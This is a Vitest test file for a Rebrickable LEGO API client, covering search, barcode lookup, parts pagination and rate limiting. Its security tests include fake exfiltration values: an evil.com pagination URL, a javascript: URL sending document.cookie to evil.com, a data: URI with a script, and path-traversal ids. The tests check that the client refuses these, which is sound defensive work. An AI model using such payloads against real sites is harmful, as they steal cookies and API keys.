import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  searchRebrickable,
  findRebrickableByBarcode,
  findRebrickableItem,
  fetchSetInventorySets,
  fetchPartsForInventory,
  findRebrickableElement,
  RateLimitError,
} from './rebrickable';
import { getConfig } from '../config';

vi.mock('../config', () => ({
  getConfig: vi.fn()
}));

const mockFetch = vi.fn();
// Stubbed PER TEST, not once at module scope. A bare `global.fetch = ...` never
// unwinds, and even a module-scope `vi.stubGlobal` loses under a shared realm:
// two test files install competing stubs onto the same global and whichever
// unstubs first strips the other's. Re-stubbing in `beforeEach` makes each test
// own its fetch regardless of what any other file did.

describe('Rebrickable Service', () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  beforeEach(() => {
    vi.stubGlobal('fetch', mockFetch);
    vi.clearAllMocks();
    (getConfig as any).mockReturnValue({ rebrickableApiKey: 'test-api-key' });
  });

  describe('findRebrickableByBarcode', () => {
    it('should find an item by barcode', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => ({
          results: [
            { set_num: '75312-1', name: "Boba Fett's Starship", year: 2021, theme_id: 158, num_parts: 593, set_img_url: 'http://example.com/75312.jpg' }
          ]
        })
      });
      const item = await findRebrickableByBarcode('5702016913484');
      expect(item?.number).toBe('75312-1');
      expect(mockFetch).toHaveBeenCalledWith(expect.stringContaining('barcode=5702016913484'));
    });

    it('should return null if API returns no results', async () => {
      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({ results: [] })
      });
      const item = await findRebrickableByBarcode('0000000000000');
      expect(item).toBeNull();
    });

    it('throws RateLimitError with correct retryAfter on 429', async () => {
      mockFetch.mockResolvedValueOnce({
        status: 429, ok: false,
        headers: { get: (k: string) => k === 'Retry-After' ? '30' : null },
      });
      await expect(findRebrickableByBarcode('5702016913484'))
        .rejects.toMatchObject({ retryAfter: 30 });
    });

    it('falls back to minifigs when no set found for barcode', async () => {
      mockFetch
        .mockResolvedValueOnce({ ok: true, json: async () => ({ results: [] }) })
        .mockResolvedValueOnce({
          ok: true,
          json: async () => ({
            results: [{
              set_num: 'fig-001', name: 'Luke', year: 1999,
              theme_id: 1, num_parts: 5, set_img_url: '',
            }],
          }),
        });
      const item = await findRebrickableByBarcode('1234567890');
      expect(item?.type).toBe('minifig');
      expect(item?.number).toBe('fig-001');
    });
  });

  describe('searchRebrickable', () => {
    it('should return mapped items when API returns results', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => ({
          results: [
            { set_num: '75312-1', name: "Boba Fett's Starship", year: 2021, theme_id: 158, num_parts: 593, set_img_url: 'http://example.com/75312.jpg' }
          ]
        })
      });
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => ({ results: [] })
      });
      const items = await searchRebrickable('star wars');
      expect(items).toHaveLength(1);
      expect(items[0]).toMatchObject({ number: '75312-1', type: 'set' });
    });

    it('should return empty array if API key is missing', async () => {
      (getConfig as any).mockReturnValue({ rebrickableApiKey: null });
      const items = await searchRebrickable('star wars');
      expect(items).toEqual([]);
      expect(mockFetch).not.toHaveBeenCalled();
    });

    it('should return empty array on network failure', async () => {
      mockFetch.mockRejectedValue(new Error('Network error'));
      expect(await searchRebrickable('star wars')).toEqual([]);
    });

    it('should return empty array on non-ok status', async () => {
      mockFetch.mockResolvedValue({ ok: false, status: 500 });
      expect(await searchRebrickable('star wars')).toEqual([]);
    });

    it('throws RateLimitError with correct retryAfter on 429', async () => {
      mockFetch.mockResolvedValue({
        status: 429,
        headers: { get: (k: string) => k === 'Retry-After' ? '30' : null },
      });
      await expect(searchRebrickable('star wars'))
        .rejects.toMatchObject({ retryAfter: 30 });
    });

    it('returns empty array for queries shorter than 3 characters', async () => {
      expect(await searchRebrickable('ab')).toEqual([]);
      expect(mockFetch).not.toHaveBeenCalled();
    });
  });

  describe('findRebrickableItem', () => {
    it('fetches a set by number using the /sets/ endpoint', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => ({
          set_num: '75312-1', name: "Boba Fett's Starship", year: 2021,
          theme_id: 158, num_parts: 593, set_img_url: 'http://example.com/75312.jpg',
        }),
      });
      const item = await findRebrickableItem('75312-1', 'set');
      expect(item?.type).toBe('set');
      expect(item?.number).toBe('75312-1');
      expect(mockFetch).toHaveBeenCalledWith(expect.stringContaining('/sets/75312-1/'));
    });

    it('fetches a minifig using the /minifigs/ endpoint', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: async () => ({
          set_num: 'sw0001', name: 'Battle Droid', year: 1999,
          theme_id: 1, num_parts: 5, set_img_url: '',
        }),
      });
      const item = await findRebrickableItem('sw0001', 'minifig');
      expect(item?.type).toBe('minifig');
      expect(mockFetch).toHaveBeenCalledWith(expect.stringContaining('/minifigs/sw0001/'));
    });

    it('returns null when the API returns a non-ok response', async () => {
      mockFetch.mockResolvedValueOnce({ ok: false, status: 404 });
      expect(await findRebrickableItem('99999-1', 'set')).toBeNull();
    });

    it('propagates RateLimitError', async () => {
      mockFetch.mockResolvedValueOnce({
        status: 429, ok: false,
        headers: { get: (k: string) => k === 'Retry-After' ? '60' : null },
      });
      await expect(findRebrickableItem('75312-1', 'set'))
        .rejects.toMatchObject({ retryAfter: 60 });
    });
  });

  describe('fetchSetInventorySets', () => {
    it('returns bag set numbers when inventory sets exist', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({
          count: 2,
          next: null,
          results: [
            { set_num: '75313-B1', name: 'Bag 1', num_parts: 200, set_img_url: '' },
            { set_num: '75313-B2', name: 'Bag 2', num_parts: 150, set_img_url: '' },
          ],
        }),
      });
      const bags = await fetchSetInventorySets('75313-1');
      expect(bags).toEqual(['75313-B1', '75313-B2']);
      expect(mockFetch).toHaveBeenCalledWith(expect.stringContaining('/sets/75313-1/sets/'));
    });

    it('returns empty array when no inventory sets exist', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ count: 0, next: null, results: [] }),
      });
      expect(await fetchSetInventorySets('10305-1')).toEqual([]);
    });

    it('returns empty array when API key is missing', async () => {
      (getConfig as any).mockReturnValue({ rebrickableApiKey: null });
      expect(await fetchSetInventorySets('75313-1')).toEqual([]);
      expect(mockFetch).not.toHaveBeenCalled();
    });

    it('returns empty array on non-ok response', async () => {
      mockFetch.mockResolvedValueOnce({ ok: false, status: 404 });
      expect(await fetchSetInventorySets('75313-1')).toEqual([]);
    });

    it('propagates RateLimitError', async () => {
      mockFetch.mockResolvedValueOnce({
        status: 429, ok: false,
        headers: { get: (k: string) => k === 'Retry-After' ? '45' : null },
      });
      await expect(fetchSetInventorySets('75313-1'))
        .rejects.toMatchObject({ retryAfter: 45 });
    });
  });

  describe('fetchPartsForInventory', () => {
    it('maps API results to SetPart with given bagNum', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        status: 200,
        headers: { get: () => null },
        json: async () => ({
          count: 1,
          next: null,
          results: [
            {
              part: { part_num: '3001', name: 'Brick 2 x 4', part_img_url: 'https://cdn.rebrickable.com/3001.png' },
              color: { name: 'Red' },
              quantity: 2,
              is_spare: false,
            },
          ],
        }),
      });
      const parts = await fetchPartsForInventory('75313-B1', 1);
      expect(parts).toHaveLength(1);
      expect(parts[0]).toEqual({
        partNum: '3001',
        partName: 'Brick 2 x 4',
        colorName: 'Red',
        quantity: 2,
        bagNum: 1,
        imgUrl: 'https://cdn.rebrickable.com/3001.png',
        isSpare: false,
      });
      expect(mockFetch).toHaveBeenCalledWith(expect.stringContaining('/sets/75313-B1/parts/'));
    });

    it('uses null bagNum when passed null', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        status: 200,
        headers: { get: () => null },
        json: async () => ({
          count: 1,
          next: null,
          results: [
            {
              part: { part_num: '3001', name: 'Brick 2 x 4', part_img_url: '' },
              color: { name: 'Red' },
              quantity: 1,
              is_spare: true,
            },
          ],
        }),
      });
      const parts = await fetchPartsForInventory('10305-1', null);
      expect(parts[0].bagNum).toBeNull();
      expect(parts[0].isSpare).toBe(true);
    });

    it('follows pagination and concatenates results', async () => {
      mockFetch
        .mockResolvedValueOnce({
          ok: true,
          status: 200,
          headers: { get: () => null },
          json: async () => ({
            count: 2,
            next: 'https://rebrickable.com/api/v3/lego/sets/75313-1/parts/?key=test-api-key&page=2',
            results: [
              {
                part: { part_num: '3001', name: 'Brick 2 x 4', part_img_url: '' },
                color: { name: 'Red' },
                quantity: 1,
                is_spare: false,
              },
            ],
          }),
        })
        .mockResolvedValueOnce({
          ok: true,
          status: 200,
          headers: { get: () => null },
          json: async () => ({
            count: 2,
            next: null,
            results: [
              {
                part: { part_num: '3002', name: 'Brick 1 x 4', part_img_url: '' },
                color: { name: 'Blue' },
                quantity: 3,
                is_spare: false,
              },
            ],
          }),
        });
      const parts = await fetchPartsForInventory('75313-1', null);
      expect(parts).toHaveLength(2);
      expect(parts[1].partNum).toBe('3002');
      expect(mockFetch).toHaveBeenCalledTimes(2);
    });

    it('returns empty array when API key is missing', async () => {
      (getConfig as any).mockReturnValue({ rebrickableApiKey: null });
      expect(await fetchPartsForInventory('75313-1', 1)).toEqual([]);
      expect(mockFetch).not.toHaveBeenCalled();
    });

    it('returns partial results and stops on non-ok response mid-page', async () => {
      mockFetch
        .mockResolvedValueOnce({
          ok: true,
          status: 200,
          headers: { get: () => null },
          json: async () => ({
            count: 2,
            next: 'https://rebrickable.com/api/v3/lego/sets/75313-1/parts/?page=2',
            results: [
              {
                part: { part_num: '3001', name: 'Brick 2 x 4', part_img_url: '' },
                color: { name: 'Red' },
                quantity: 1,
                is_spare: false,
              },
            ],
          }),
        })
        .mockResolvedValueOnce({ ok: false, status: 500, headers: { get: () => null } });
      const parts = await fetchPartsForInventory('75313-1', null);
      expect(parts).toHaveLength(1);
    });

    it('propagates RateLimitError', async () => {
      mockFetch.mockResolvedValueOnce({
        status: 429, ok: false,
        headers: { get: (k: string) => k === 'Retry-After' ? '45' : null },
      });
      await expect(fetchPartsForInventory('75313-1', 1))
        .rejects.toMatchObject({ retryAfter: 45 });
    });

    it('returns empty array on network failure', async () => {
      mockFetch.mockRejectedValueOnce(new Error('Network error'));
      expect(await fetchPartsForInventory('75313-1', null)).toEqual([]);
    });

    // SEC-R005: off-domain `page.next` must not be fetched
    it('does not follow page.next pointing to an off-domain URL', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true, status: 200, headers: { get: () => null },
        json: async () => ({
          count: 2,
          next: 'https://evil.com/steal-your-api-key',
          results: [{ part: { part_num: '3001', name: 'Brick 2x4', part_img_url: '' }, color: { name: 'Red' }, quantity: 1, is_spare: false }],
        }),
      });
      const parts = await fetchPartsForInventory('75313-1', null);
      expect(parts).toHaveLength(1);
      expect(mockFetch).toHaveBeenCalledTimes(1);
    });

    it('does not follow page.next with a javascript: URL', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true, status: 200, headers: { get: () => null },
        json: async () => ({
          count: 1,
          next: 'javascript:fetch("https://evil.com/?key="+document.cookie)',
          results: [{ part: { part_num: '3002', name: 'Plate 1x2', part_img_url: '' }, color: { name: 'Blue' }, quantity: 4, is_spare: false }],
        }),
      });
      const parts = await fetchPartsForInventory('75313-1', null);
      expect(parts).toHaveLength(1);
      expect(mockFetch).toHaveBeenCalledTimes(1);
    });

    it('does not follow page.next with a data: URI', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true, status: 200, headers: { get: () => null },
        json: async () => ({
          count: 1,
          next: 'data:text/html,<script>fetch("https://evil.com")</script>',
          results: [{ part: { part_num: '3003', name: 'Tile 2x2', part_img_url: '' }, color: { name: 'White' }, quantity: 2, is_spare: true }],
        }),
      });
      const parts = await fetchPartsForInventory('75313-1', null);
      expect(parts).toHaveLength(1);
      expect(mockFetch).toHaveBeenCalledTimes(1);
    });

    it('does not follow page.next that uses http:// (protocol downgrade)', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true, status: 200, headers: { get: () => null },
        json: async () => ({
          count: 1,
          next: 'http://rebrickable.com/api/v3/lego/sets/75313-1/parts/?page=2',
          results: [{ part: { part_num: '3004', name: 'Slope', part_img_url: '' }, color: { name: 'Yellow' }, quantity: 3, is_spare: false }],
        }),
      });
      const parts = await fetchPartsForInventory('75313-1', null);
      expect(parts).toHaveLength(1);
      expect(mockFetch).toHaveBeenCalledTimes(1);
    });
  });

  describe('findRebrickableElement', () => {
    // Payload shape captured from a live call to
    // GET /api/v3/lego/elements/6206150/
    const elementPayload = {
      element_id: '6206150',
      part: {
        part_num: '24866',
        name: 'Plant, Flower, Plate Round 1 x 1 with 5 Petals',
        part_img_url: 'https://cdn.rebrickable.com/media/parts/elements/6206150.jpg',
      },
      color: { name: 'Bright Green' },
    };

    it('resolves an element id to its part, colour and image', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true, status: 200, headers: { get: () => null },
        json: async () => elementPayload,
      });

      const info = await findRebrickableElement('6206150');

      expect(info).toEqual({
        elementId: '6206150',
        partNum: '24866',
        name: 'Plant, Flower, Plate Round 1 x 1 with 5 Petals',
        colorName: 'Bright Green',
        imageUrl: 'https://cdn.rebrickable.com/media/parts/elements/6206150.jpg',
      });
      expect(mockFetch).toHaveBeenCalledWith(expect.stringContaining('/elements/6206150/'));
    });

    it('trims surrounding whitespace from the id', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true, status: 200, headers: { get: () => null },
        json: async () => elementPayload,
      });

      await findRebrickableElement('  6206150 ');

      expect(mockFetch).toHaveBeenCalledWith(expect.stringContaining('/elements/6206150/'));
    });

    it.each([
      ['path traversal', '../sets/10305-1'],
      ['a slash', '6206150/foo'],
      ['a query separator', '6206150?key=leaked'],
      ['empty', ''],
      ['over-long input', '1'.repeat(21)],
    ])('rejects %s without issuing a request', async (_label, id) => {
      // The id is interpolated into the request path, so anything that is not a
      // plain element id must be refused before it can reshape the URL.
      const info = await findRebrickableElement(id);

      expect(info).toBeNull();
      expect(mockFetch).not.toHaveBeenCalled();
    });

    it('returns null when the element is not catalogued', async () => {
      mockFetch.mockResolvedValueOnce({ ok: false, status: 404, headers: { get: () => null } });

      expect(await findRebrickableElement('9999999')).toBeNull();
    });

    it('returns null when the payload carries no part', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true, status: 200, headers: { get: () => null },
        json: async () => ({ element_id: '6206150' }),
      });

      expect(await findRebrickableElement('6206150')).toBeNull();
    });

    it('tolerates a missing colour rather than throwing', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true, status: 200, headers: { get: () => null },
        json: async () => ({ ...elementPayload, color: undefined }),
      });

      const info = await findRebrickableElement('6206150');

      expect(info?.colorName).toBe('');
      expect(info?.name).toBe('Plant, Flower, Plate Round 1 x 1 with 5 Petals');
    });

    it('reports an absent image as empty, not as a placeholder URL', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true, status: 200, headers: { get: () => null },
        json: async () => ({ ...elementPayload, part: { ...elementPayload.part, part_img_url: null } }),
      });

      expect((await findRebrickableElement('6206150'))?.imageUrl).toBe('');
    });

    it('returns null when no API key is configured', async () => {
      (getConfig as any).mockReturnValue({});

      expect(await findRebrickableElement('6206150')).toBeNull();
      expect(mockFetch).not.toHaveBeenCalled();
    });

    it('propagates a rate limit so the caller can degrade deliberately', async () => {
      mockFetch.mockResolvedValueOnce({
        status: 429, ok: false,
        headers: { get: (k: string) => (k === 'Retry-After' ? '30' : null) },
      });

      await expect(findRebrickableElement('6206150')).rejects.toThrow(RateLimitError);
    });
  });
});
